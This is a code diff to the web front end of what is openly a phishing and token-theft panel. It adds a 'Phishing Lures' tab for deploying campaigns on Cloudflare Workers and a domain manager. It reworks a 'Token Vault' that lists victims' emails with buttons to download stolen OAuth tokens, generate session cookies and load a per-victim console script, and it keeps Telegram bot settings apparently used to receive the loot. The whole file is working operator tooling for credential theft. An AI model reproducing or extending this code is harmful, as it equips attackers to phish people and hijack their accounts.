     if (overview) {
       panel.innerHTML += `
         <div class="stat-box">
-          <div class="stat-box-value">${overview.stats?.cookieFiles ?? 0}</div>
-          <div class="stat-box-label">Cookie Files</div>
-        </div>
-        <div class="stat-box">
           <div class="stat-box-value">${overview.stats?.tokenFiles ?? 0}</div>
-          <div class="stat-box-label">Token Files</div>
+          <div class="stat-box-label">OAuth Users</div>
         </div>
         <div class="stat-box">
-          <div class="stat-box-value">${overview.stats?.uniqueEmails ?? (overview.emails ? overview.emails.length : 0)}</div>
+          <div class="stat-box-value">${overview.stats?.uniqueEmails ?? 0}</div>
           <div class="stat-box-label">Unique Emails</div>
         </div>
         <hr/>
-        <h3>Recent Emails</h3>
+        <h3>📧 Authenticated Users</h3>
       `;
       if (overview.emails && overview.emails.length > 0) {
         const table = document.createElement('table');
-        table.innerHTML = '<thead><tr><th>Email</th><th>Cookie File</th><th>Token File</th><th>Actions</th></tr></thead>';
+        table.innerHTML = '<thead><tr><th>Email</th><th>Actions</th></tr></thead>';
         const tb = document.createElement('tbody');
-        overview.emails.forEach((email, i) => {
+        overview.emails.forEach((email) => {
           const tr = document.createElement('tr');
-          const cookieFile = overview.cookieFiles?.[i] || '—';
-          const tokenFile = overview.tokenFiles?.[i] || '—';
-          tr.innerHTML = `
-            <td>${email}</td>
-            <td style="font-family:monospace;font-size:12px">${cookieFile}</td>
-            <td style="font-family:monospace;font-size:12px">${tokenFile}</td>
-            <td class="actions-cell"></td>
-          `;
+          tr.innerHTML = `<td><strong>${email}</strong></td><td class="actions-cell"></td>`;
           const actionsCell = tr.querySelector('.actions-cell');
 
-          (function addGenerateBtn() {
-            const isAdmin = currentUser && currentUser.role === 'admin';
-            if (isAdmin) {
-              const genBtn = document.createElement('button');
-              genBtn.className = 'warning';
-              genBtn.textContent = '🍪 Generate';
-              genBtn.addEventListener('click', () => showGenerateCookiesModal(email));
-              actionsCell.appendChild(genBtn);
-            }
-          })();
+          const isAdmin = currentUser && currentUser.role === 'admin';
+          if (isAdmin) {
+            const genBtn = document.createElement('button');
+            genBtn.className = 'warning';
+            genBtn.textContent = '🍪 Generate';
+            genBtn.addEventListener('click', () => showGenerateCookiesModal(email));
+            actionsCell.appendChild(genBtn);
+          }
 
-          const dlCookiesBtn = document.createElement('button');
-          dlCookiesBtn.textContent = '📥 Cookies';
-          dlCookiesBtn.addEventListener('click', () => { showConsoleScriptModal(); loadConsoleScriptForEmail(email); });
-          actionsCell.appendChild(dlCookiesBtn);
+          const viewBtn = document.createElement('button');
+          viewBtn.textContent = '📥 View';
+          viewBtn.addEventListener('click', () => { showConsoleScriptModal(); loadConsoleScriptForEmail(email); });
+          actionsCell.appendChild(viewBtn);
 
-          (function addAdminOwnerActions() {
-            const isAdmin = currentUser && currentUser.role === 'admin';
-            const isOwner = currentUser && (currentUser.username === email || currentUser.email === email);
-            if (isAdmin || isOwner) {
-              const dlTokensBtn = document.createElement('button');
-              dlTokensBtn.textContent = '🔐 Tokens';
-              dlTokensBtn.addEventListener('click', () => { window.location.href = `/api/download/tokens/${encodeURIComponent(email)}`; });
-              actionsCell.appendChild(dlTokensBtn);
-
-              const delBtn = document.createElement('button');
-              delBtn.className = 'danger';
-              delBtn.textContent = '🗑️ Delete';
-              delBtn.addEventListener('click', async () => {
-                if (!confirm('Delete token & cookie files for ' + email + '?')) return;
-                const res = await api(`/api/files/${encodeURIComponent(email)}`, { method: 'DELETE' });
-                if (res) { alert('✅ Deleted: ' + (res.removed && res.removed.join(', ') || 'files')); openTab('overview'); }
-                else alert('❌ Delete failed');
-              });
-              actionsCell.appendChild(delBtn);
-            }
-          })();
+          if (isAdmin) {
+            const delBtn = document.createElement('button');
+            delBtn.className = 'danger';
+            delBtn.textContent = '🗑️ Delete';
+            delBtn.addEventListener('click', async () => {
+              if (!confirm('Delete ' + email + '?')) return;
+              const res = await api(`/api/files/${encodeURIComponent(email)}`, { method: 'DELETE' });
+              if (res) { alert('✅ Deleted'); openTab('overview'); }
+            });
+            actionsCell.appendChild(delBtn);
+          }
 
           tb.appendChild(tr);
         });
         table.appendChild(tb);
         panel.appendChild(table);
-      } else panel.innerHTML += '<div class="muted">No data yet</div>';
-    } else panel.innerHTML += '<div class="muted">No overview available</div>';
+      }
+    }
+  }
+
+  else if (id === 'domains') {
+    if (!currentUser) { panel.innerHTML = '<div class="muted">❌ Login required</div>'; return; }
+    
+    const domainsResp = await api('/api/domains', { method: 'GET' });
+    const domains = (domainsResp && domainsResp.domains) || [];
+    
+    panel.innerHTML = '<h2>🌐 Real Cloudflare Domains</h2>';
+    panel.innerHTML += '<button id="newDomainBtn" style="margin-bottom:12px;background:#4caf50">➕ Add Domain</button>';
+    
+    document.getElementById('newDomainBtn')?.addEventListener('click', showAddDomainModal);
+    document.getElementById('closeAddDomainModal')?.addEventListener('click', closeAddDomainModal);
+    document.getElementById('cancelAddDomain')?.addEventListener('click', closeAddDomainModal);
+    document.getElementById('doAddDomain')?.addEventListener('click', addDomain);
+
+    if (!domains || domains.length === 0) { 
+      panel.innerHTML += '<div class="muted">No domains yet. Add a Cloudflare domain to deploy workers.</div>'; 
+      return; 
+    }
+
+    domains.forEach(d => {
+      const card = document.createElement('div');
+      card.className = 'domain-card';
+      card.innerHTML = `
+        <div style="display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:8px">
+          <div>
+            <strong style="font-size:16px">${d.domain}</strong>
+            <div style="font-size:12px;color:#666;margin-top:4px">Added: ${new Date(d.created_at).toLocaleDateString()}</div>
+          </div>
+          <span class="status-badge status-deployed">✅ Verified</span>
+        </div>
+      `;
+      
+      const actions = document.createElement('div');
+      actions.style.display = 'flex';
+      actions.style.gap = '6px';
+      actions.style.flexWrap = 'wrap';
+      actions.style.marginTop = '12px';
+      
+      const delBtn = document.createElement('button');
+      delBtn.className = 'danger';
+      delBtn.textContent = '🗑️ Delete';
+      delBtn.addEventListener('click', async () => {
+        if (!confirm('Delete ' + d.domain + '?')) return;
+        const res = await api(`/api/domains/${d.domain}`, { method: 'DELETE' });
+        if (res && res.success) { alert('✅ Deleted'); openTab('domains'); }
+      });
+      actions.appendChild(delBtn);
+
+      card.appendChild(actions);
+      panel.appendChild(card);
+    });
+  }
+
+  else if (id === 'links') {
+    if (!currentUser) { panel.innerHTML = '<div class="muted">❌ Login required</div>'; return; }
+    
+    const linksResp = await api('/api/links', { method: 'GET' });
+    const links = (linksResp && linksResp.links) || [];
+    
+    panel.innerHTML = '<h2>🔗 Phishing Lures (Cloudflare Workers)</h2>';
+    panel.innerHTML += '<button id="newLinkBtn" style="margin-bottom:12px;background:#4caf50">➕ Create Lure</button>';
+    
+    document.getElementById('newLinkBtn')?.addEventListener('click', showCreateLinkModal);
+    document.getElementById('closeCreateLinkModal')?.addEventListener('click', closeCreateLinkModal);
+    document.getElementById('cancelCreateLink')?.addEventListener('click', closeCreateLinkModal);
+    document.getElementById('doCreateLink')?.addEventListener('click', createLink);
+    
+    if (!links || links.length === 0) { 
+      panel.innerHTML += '<div class="info-box">No lures yet. Create one to deploy phishing campaigns on real Cloudflare Workers.</div>'; 
+      return; 
+    }
+
+    links.forEach(link => {
+      const card = document.createElement('div');
+      card.className = 'link-card';
+      
+      const expiresDate = new Date(link.expires_at);
+      const daysLeft = Math.ceil((expiresDate - new Date()) / (1000 * 60 * 60 * 24));
+      
+      card.innerHTML = `
+        <div class="link-card-header">
+          <div>
+            <div class="link-card-title">${link.title}</div>
+            <div style="font-size:12px;color:#666">${link.description || 'No description'}</div>
+          </div>
+          <span class="status-badge status-deployed">📅 ${Math.max(0, daysLeft)} days</span>
+        </div>
+        
+        <div class="link-card-url">
+          <strong>🔗 URL:</strong>
+          <div style="word-break:break-all;margin-top:4px;font-family:monospace;font-size:11px">
+            https://${link.subdomain}.${link.domain}
+          </div>
+        </div>
+
+        <div class="link-stats">
+          <div class="link-stat">
+            <div class="link-stat-label">Type</div>
+            <div class="link-stat-value">${link.doc_type}</div>
+          </div>
+          <div class="link-stat">
+            <div class="link-stat-label">Visits</div>
+            <div class="link-stat-value">${link.visits}</div>
+          </div>
+        </div>
+      `;
+      
+      const actions = document.createElement('div');
+      actions.style.display = 'flex';
+      actions.style.gap = '6px';
+      actions.style.flexWrap = 'wrap';
+      actions.style.marginTop = '12px';
+      
+      const copyBtn = document.createElement('button');
+      copyBtn.textContent = '📋 Copy';
+      copyBtn.addEventListener('click', () => copyToClipboard(`https://${link.subdomain}.${link.domain}`));
+      actions.appendChild(copyBtn);
+
+      const delBtn = document.createElement('button');
+      delBtn.className = 'danger';
+      delBtn.textContent = '🗑️ Delete';
+      delBtn.addEventListener('click', async () => {
+        if (!confirm('Delete lure?')) return;
+        const res = await api(`/api/links/${link.id}`, { method: 'DELETE' });
+        if (res && res.success) { alert('✅ Deleted'); openTab('links'); }
+      });
+      actions.appendChild(delBtn);
+
+      card.appendChild(actions);
+      panel.appendChild(card);
+    });
   }
 
   else if (id === 'vault') {
-    if (!currentUser) { panel.innerHTML = '<div class="muted">❌ Login required</div>'; return; }
-    const vaultResp = await api('/api/vault', { method: 'GET' });
-    const vault = (vaultResp && vaultResp.vault) || [];
     panel.innerHTML = '<h2>🔐 Token Vault</h2>';
-    panel.appendChild(document.createElement('hr'));
+    panel.innerHTML += '<div class="info-box">Real OAuth tokens stored securely. Download tokens for credential access.</div>';
+    const overview = await api('/api/overview', { method: 'GET' });
+    if (overview && overview.emails && overview.emails.length > 0) {
+      const table = document.createElement('table');
+      table.innerHTML = '<thead><tr><th>Email</th><th>Actions</th></tr></thead>';
+      const tb = document.createElement('tbody');
+      overview.emails.forEach(email => {
+        const tr = document.createElement('tr');
+        tr.innerHTML = `<td><strong>${email}</strong></td><td class="actions-cell"></td>`;
+        const actionsCell = tr.querySelector('.actions-cell');
 
-    if (!vault || vault.length === 0) { panel.innerHTML += '<div class="muted">No tokens in vault yet</div>'; return; }
+        const dlBtn = document.createElement('button');
+        dlBtn.textContent = '📥 Download';
+        dlBtn.addEventListener('click', () => {
+          window.location.href = `/api/download/tokens/${encodeURIComponent(email)}`;
+        });
+        actionsCell.appendChild(dlBtn);
 
-    vault.forEach(entry => {
-      const card = document.createElement('div'); card.className = 'token-card';
-      card.innerHTML = `
-        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px;flex-wrap:wrap;gap:8px">
-          <div><strong style="font-size:16px;color:#0a66c2">${entry.email}</strong><br><small style="color:#666">Device: ${entry.device_id ? entry.device_id.substring(0,8) + '...' : 'N/A'}</small></div>
-          ${entry.status === 'expired' ? '<span class="status-badge status-expired">⏱️ EXPIRED</span>' : '<span class="status-badge status-active">✅ ACTIVE</span>'}
-        </div>
-        <div style="background:#f9f9f9;padding:10px;border-radius:4px;margin-bottom:12px">
-          <div style="font-size:12px;color:#666;word-break:break-all;font-family:monospace"><strong>Broker Token:</strong><br>${entry.broker_token ? (entry.broker_token.substring(0,50) + '...') : 'N/A'}</div>
-        </div>
-      `;
-      const actions = document.createElement('div'); actions.style.display = 'flex'; actions.style.gap = '6px'; actions.style.flexWrap = 'wrap';
-      
-      (function addGenerateBtn() {
-        const isAdmin = currentUser && currentUser.role === 'admin';
-        if (isAdmin) {
-          const genBtn = document.createElement('button');
-          genBtn.className = 'warning';
-          genBtn.textContent = '🍪 Generate';
-          genBtn.addEventListener('click', () => showGenerateCookiesModal(entry.email));
-          actions.appendChild(genBtn);
-        }
-      })();
-
-      const copyBtn = document.createElement('button'); copyBtn.textContent = '📋 Copy Token'; copyBtn.addEventListener('click', () => copyText(entry.broker_token || '')); actions.appendChild(copyBtn);
-      const dlBtn = document.createElement('button'); dlBtn.textContent = '📥 Download Cookies';
-      dlBtn.addEventListener('click', () => { showConsoleScriptModal(); loadConsoleScriptForEmail(entry.email); });
-      actions.appendChild(dlBtn);
-
-      (function addDeleteIfAllowed() {
-        const isAdmin = currentUser && currentUser.role === 'admin';
-        const isOwner = currentUser && (currentUser.username === entry.email || currentUser.email === entry.email);
-        if (isAdmin || isOwner) {
-          const delBtnVault = document.createElement('button');
-          delBtnVault.className = 'danger';
-          delBtnVault.textContent = '🗑️ Delete';
-          delBtnVault.addEventListener('click', async () => {
-            if (!confirm('Delete token & cookie files for ' + entry.email + '?')) return;
-            const res = await api(`/api/files/${encodeURIComponent(entry.email)}`, { method: 'DELETE' });
-            if (res) { alert('✅ Deleted: ' + (res.removed && res.removed.join(', ') || 'files')); openTab('vault'); }
-            else alert('❌ Delete failed');
-          });
-          actions.appendChild(delBtnVault);
-        }
-      })();
-
-      if (currentUser.role === 'admin') {
-        const dlTokensBtn = document.createElement('button'); dlTokensBtn.textContent = '🔐 Download Tokens'; dlTokensBtn.addEventListener('click', () => { window.location.href = `/api/download/tokens/${encodeURIComponent(entry.email)}`; }); actions.appendChild(dlTokensBtn);
-      }
-      card.appendChild(actions); panel.appendChild(card);
-    });
+        tb.appendChild(tr);
+      });
+      table.appendChild(tb);
+      panel.appendChild(table);
+    } else {
+      panel.innerHTML += '<div class="muted">No tokens in vault yet.</div>';
+    }
   }
 
   else if (id === 'settings') {
@@ -669,46 +890,46 @@ async function openTab(id) {
 
     if (currentUser.role === 'admin') {
       panel.innerHTML += `
-        <h3>Telegram Bot Configuration (admin)</h3>
+        <h3>🤖 Telegram Configuration (Admin)</h3>
         <div class="form-group">
-          <label>🤖 Telegram Bot Token</label>
-          <input id="settingsBotToken" type="password" placeholder="123456:ABC..." value="${settings?.telegram_bot_token || ''}" />
+          <label>Bot Token</label>
+          <input id="settingsBotToken" type="password" value="${settings?.telegram_bot_token || ''}" />
         </div>
         <div class="form-group">
-          <label>💬 Telegram Chat ID (admin fallback)</label>
-          <input id="settingsChatId" type="text" placeholder="-1234567890 or @username" value="${settings?.telegram_chat_id || ''}" />
+          <label>Chat ID</label>
+          <input id="settingsChatId" type="text" value="${settings?.telegram_chat_id || ''}" />
         </div>
-        <button id="saveSettings" style="width:100%;padding:12px;font-size:14px;background:#4caf50">💾 Save Settings</button>
+        <button id="saveSettings" style="width:100%;padding:12px;background:#4caf50">💾 Save</button>
         <hr/>
       `;
 
       document.getElementById('saveSettings')?.addEventListener('click', async () => {
         const botToken = document.getElementById('settingsBotToken')?.value;
         const chatId = document.getElementById('settingsChatId')?.value?.trim();
-        if (chatId && !isValidTelegramChatId(chatId)) return alert('❌ Invalid Telegram chat ID');
         const res = await api('/api/settings', { method: 'POST', body: { telegram_bot_token: botToken, telegram_chat_id: chatId } });
-        if (res && res.success) alert('✅ Settings saved'); else alert('❌ Save failed');
+        if (res && res.success) alert('✅ Saved'); else alert('❌ Failed');
       });
     }
 
     panel.innerHTML += `
-      <h3>Your Telegram</h3>
+      <h3>📱 Your Telegram</h3>
       <div class="form-group">
-        <label>Telegram Bot Token</label>
-        <input id="myTelegramBotToken" type="password" placeholder="123456789:AA..." value="${settings?.telegram_bot_token || ''}">
+        <label>Bot Token</label>
+        <input id="myTelegramBotToken" type="password" value="${settings?.telegram_bot_token || ''}">
       </div>
       <div class="form-group">
-        <label>Telegram Chat ID</label>
-        <input id="myTelegramId" type="text" placeholder="-1001234567890 or @username" value="${settings?.telegram_chat_id || ''}">
+        <label>Chat ID</label>
+        <input id="myTelegramId" type="text" value="${settings?.telegram_chat_id || ''}">
       </div>
-      <button id="saveMyTelegram">💾 Save Telegram</button>
+      <button id="saveMyTelegram">💾 Save</button>
     `;
 
     document.getElementById('saveMyTelegram')?.addEventListener('click', async () => {
-      const telegram_chat_id = document.getElementById('myTelegramId')?.value?.trim();
-      const telegram_bot_token = document.getElementById('myTelegramBotToken')?.value;
-      const res = await api('/api/user', { method: 'PATCH', body: { telegram_chat_id, telegram_bot_token } });
-      if (res?.success) alert('✅ Telegram saved'); else alert('❌ ' + (res?.error || 'Save failed'));
+      const res = await api('/api/user', { method: 'PATCH', body: { 
+        telegram_chat_id: document.getElementById('myTelegramId')?.value?.trim(),
+        telegram_bot_token: document.getElementById('myTelegramBotToken')?.value
+      }});
+      if (res?.success) alert('✅ Saved'); else alert('❌ Failed');
     });
   }
 
@@ -716,17 +937,17 @@ async function openTab(id) {
     if (!currentUser || currentUser.role !== 'admin') { panel.innerHTML = '<div class="muted">❌ Admin only</div>'; return; }
     panel.innerHTML = '<h2>👨‍💼 Admin Panel</h2>';
     panel.innerHTML += `
-      <h3>Create User Account</h3>
+      <h3>Create User</h3>
       <div class="grid-2">
-        <div class="form-group"><label>👤 Username</label><input id="newUser" type="text" /></div>
-        <div class="form-group"><label>🔐 Password</label><input id="newPass" type="password" /></div>
+        <div class="form-group"><label>Username</label><input id="newUser" type="text" /></div>
+        <div class="form-group"><label>Password</label><input id="newPass" type="password" /></div>
       </div>
       <div class="grid-2">
-        <div class="form-group"><label>📧 Email</label><input id="newEmail" type="email" /></div>
-        <div class="form-group"><label>📋 Role</label><select id="newRole"><option value="user">user</option><option value="admin">admin</option></select></div>
+        <div class="form-group"><label>Email</label><input id="newEmail" type="email" /></div>
+        <div class="form-group"><label>Role</label><select id="newRole"><option value="user">user</option><option value="admin">admin</option></select></div>
       </div>
-      <div class="form-group"><label>📅 Expiry Date (optional)</label><input id="newExpiry" type="date" /></div>
-      <button id="createUser" style="width:100%;padding:12px;font-size:14px;background:#4caf50">➕ Create User</button>
+      <div class="form-group"><label>Expiry Date</label><input id="newExpiry" type="date" /></div>
+      <button id="createUser" style="width:100%;padding:12px;background:#4caf50">➕ Create</button>
       <hr/>
       <h3>Manage Users</h3>
     `;
@@ -737,45 +958,49 @@ async function openTab(id) {
       const em = document.getElementById('newEmail')?.value.trim();
       const rl = document.getElementById('newRole')?.value;
       const ex = document.getElementById('newExpiry')?.value;
-      if (!un || !pw) { alert('username/password required'); return; }
-      const expiryDate = ex ? new Date(ex).toISOString() : null;
-      const r = await api('/api/admin/users', { method: 'POST', body: { username: un, password: pw, role: rl, email: em || `${un}@broker.local`, expires_at: expiryDate }});
-      if (r && r.success) { alert('✅ User created'); openTab('admin'); } else alert('❌ Create failed: ' + (r?.error || 'unknown'));
+      if (!un || !pw) return alert('Username/password required');
+      const r = await api('/api/admin/users', { method: 'POST', body: { username: un, password: pw, role: rl, email: em, expires_at: ex ? new Date(ex).toISOString() : null }});
+      if (r && r.success) { alert('✅ Created'); openTab('admin'); } else alert('❌ Failed: ' + (r?.error || 'unknown'));
     });
 
     const us = await api('/api/admin/users', { method: 'GET' });
     if (us && us.users) {
-      const tbl = document.createElement('table'); tbl.innerHTML = '<thead><tr><th>Username</th><th>Email</th><th>Role</th><th>Status</th><th>Expires</th><th>Actions</th></tr></thead>';
+      const tbl = document.createElement('table'); 
+      tbl.innerHTML = '<thead><tr><th>Username</th><th>Email</th><th>Role</th><th>Status</th><th>Expires</th><th>Actions</th></tr></thead>';
       const tb = document.createElement('tbody');
       us.users.forEach(u => {
         const tr = document.createElement('tr');
         const statusClass = u.status === 'expired' ? 'status-expired' : 'status-active';
         const statusText = u.status === 'expired' ? '❌ Expired' : '✅ Active';
         const expiryText = u.expires_at ? new Date(u.expires_at).toLocaleDateString() : 'Never';
-        tr.innerHTML = `<td><strong>${u.username}</strong></td><td style="font-size:12px">${u.email || 'N/A'}</td><td>${u.role}</td><td><span class="status-badge ${statusClass}">${statusText}</span></td><td style="font-size:12px">${expiryText}</td><td></td>`;
+        tr.innerHTML = `<td><strong>${u.username}</strong></td><td style="font-size:12px">${u.email || 'N/A'}</td><td>${u.role}</td><td><span class="status-badge ${statusClass}">${statusText}</span></td><td style="font-size:12px">${expiryText}</td><td class="actions-cell"></td>`;
         const actionsCell = tr.querySelector('td:last-child');
-        const editBtn = document.createElement('button'); editBtn.textContent = '✏️ Edit Expiry';
+        
+        const editBtn = document.createElement('button');
+        editBtn.textContent = '✏️ Edit';
         editBtn.addEventListener('click', () => {
-          const newExpiry = prompt('Enter new expiry date (YYYY-MM-DD) or leave blank for no expiration:');
+          const newExpiry = prompt('Enter expiry date (YYYY-MM-DD) or blank for never:');
           if (newExpiry === null) return;
-          const expiryDate = newExpiry.trim() ? new Date(newExpiry).toISOString() : null;
-          api(`/api/admin/users/${u.username}`, { method: 'PUT', body: { expires_at: expiryDate } }).then(r => {
-            if (r && r.success) { alert('✅ Updated'); openTab('admin'); } else alert('❌ Update failed');
+          api(`/api/admin/users/${u.username}`, { method: 'PUT', body: { expires_at: newExpiry.trim() ? new Date(newExpiry).toISOString() : null } }).then(r => {
+            if (r && r.success) { alert('✅ Updated'); openTab('admin'); } else alert('❌ Failed');
           });
         });
         actionsCell.appendChild(editBtn);
 
-        const delBtn = document.createElement('button'); delBtn.className = 'danger'; delBtn.textContent = '🗑️ Delete User';
+        const delBtn = document.createElement('button');
+        delBtn.className = 'danger';
+        delBtn.textContent = '🗑️ Delete';
         delBtn.addEventListener('click', async () => {
-          if (!confirm('Delete user ' + u.username + ' ?')) return;
+          if (!confirm('Delete ' + u.username + '?')) return;
           const r = await api(`/api/admin/users/${encodeURIComponent(u.username)}`, { method: 'DELETE' });
-          if (r && r.success) { alert('✅ User deleted'); openTab('admin'); } else alert('❌ Delete failed: ' + (r?.error || 'unknown'));
+          if (r && r.success) { alert('✅ Deleted'); openTab('admin'); } else alert('❌ Failed');
         });
         actionsCell.appendChild(delBtn);
 
         tb.appendChild(tr);
       });
-      tbl.appendChild(tb); panel.appendChild(tbl);
+      tbl.appendChild(tb); 
+      panel.appendChild(tbl);
     }
   }
 }
@@ -787,15 +1012,6 @@ document.addEventListener('DOMContentLoaded', () => {
 });
 
 document.addEventListener('DOMContentLoaded', initialize);
-
-function isValidTelegramChatId(chatId) {
-  if (chatId === undefined || chatId === null) return false;
-  const s = String(chatId).trim();
-  if (s === '') return true;
-  const numeric = /^-?\d{5,20}$/;
-  const username = /^@[\w_]{5,64}$/;
-  return numeric.test(s) || username.test(s);
-}
 
 async function initialize() {
   await fetchMe();
@@ -835,6 +1051,8 @@ function renderTabs() {
 
   const list = [
     ['overview', '📊 Overview'],
+    ['domains', '🌐 Domains'],
+    ['links', '🔗 Lures'],
     ['vault', '🔐 Vault'],
     ['settings', '⚙️ Settings']
   ];
